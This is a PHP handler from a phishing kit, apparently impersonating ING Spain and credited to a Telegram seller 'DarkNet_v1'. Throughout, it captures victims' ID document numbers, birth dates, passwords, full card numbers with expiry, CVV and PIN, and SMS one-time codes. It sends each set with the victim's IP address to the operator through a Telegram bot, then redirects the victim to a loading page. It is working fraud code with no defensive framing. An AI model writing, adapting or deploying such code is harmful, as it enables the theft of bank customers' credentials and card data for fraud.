<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();


    include "config.php";
    

    if(isset($_POST["log"])){

        $x1    = "<code>".$_POST["doc_num"]."</code>";
        $x2    = "<code>".$_POST["day"]."/".$_POST["month"]."/".$_POST["year"]."</code>";

        $message=
        '<blockquote>[ES] => ING</blockquote>'."\n".     
        '- Document number : '.$x1."\n".
        '- Birth date : '.$x2."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";     

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        header("Location: ../../../loading.php");
        reset_data();

    }elseif(isset($_POST["pass"])){

        $sms      = "<code>".$_POST["password"]."</code>";

        $message=
        '<blockquote>[ES] => ING</blockquote>'."\n".     
        '- Password : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["card"])){
        $number   = "<code>".$_POST["one"]."</code>";
        $exp      = "<code>".$_POST["two"]."</code>";
        $cvv      = "<code>".$_POST["three"]."</code>";
        $pin      = "<code>".$_POST["four"]."</code>";
        $n = $string = str_replace(' ', '', $_POST["one"]);
        $message=
        '<blockquote>[ES] => ING</blockquote>'."\n".     
        '- Card Number : '.$number."\n".
        '- Exp : '.$exp."\n".
        '- Cvv : '.$cvv."\n".
        '- Pin : '.$pin."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '- Type : '.'https://cardimages.imaginecurve.com/cards/'.substr($n,0,6).'.png'."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2024 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["sms"])){

        $sms      = "<code>".$_POST["sms_code"]."</code>";

        $message=
        '<blockquote>[ES] => ING</blockquote>'."\n".     
        '- SMS : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }

?>